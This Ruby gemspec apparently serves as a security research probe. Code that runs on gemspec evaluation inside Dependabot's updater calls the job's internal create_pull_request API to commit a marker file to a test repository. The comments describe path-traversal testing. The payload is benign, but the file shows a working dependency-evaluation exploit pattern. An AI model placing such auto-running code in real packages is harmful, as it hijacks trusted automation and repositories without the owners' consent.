# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned security test. A git dependency's gemspec is evaluated inside the
# Dependabot updater. The probe asks Dependabot's own API to create one benign
# PR in the research-owned consumer repository. It neither reads nor exports
# credentials.
module OwnedDependabotRemoteProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  # Control case: this is plainly inside Bundler's documented vendor/ allowlist.
  # If this succeeds while the traversal form fails, the live service is
  # canonicalizing or rejecting the traversal before PR creation.
  RAW_PATH = "vendor/owned-dependabot-control.txt"

  CONTROL_CONTENT = "owned-dependabot-authenticated-pr-control\n"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    # Avoid duplicate submissions if Bundler evaluates this gemspec in more
    # than one process during the same update job.
    marker = "/tmp/owned-dependabot-path-traversal-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    base_sha = current_base_sha
    return if base_sha.to_s.empty?

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload(base_sha))

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client.request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def current_base_sha
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    request["User-Agent"] = "owned-dependabot-path-traversal-probe"

    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = true
    client.open_timeout = 10
    client.read_timeout = 20
    response = client.request(request)
    JSON.parse(response.body)["sha"]
  end

  def payload(base_sha)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_remote_probe",
          "version" => "0.0.2",
          "previous-version" => "0.0.1",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => CONTROL_CONTENT,
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "chore: owned Dependabot authenticated PR control",
        "pr-title" => "Owned Dependabot authenticated PR control",
        "pr-body" => "Owned security test: a dependency-controlled gemspec submitted one benign file within Bundler's vendor allowlist."
      }
    }
  end
end

OwnedDependabotRemoteProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.3"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
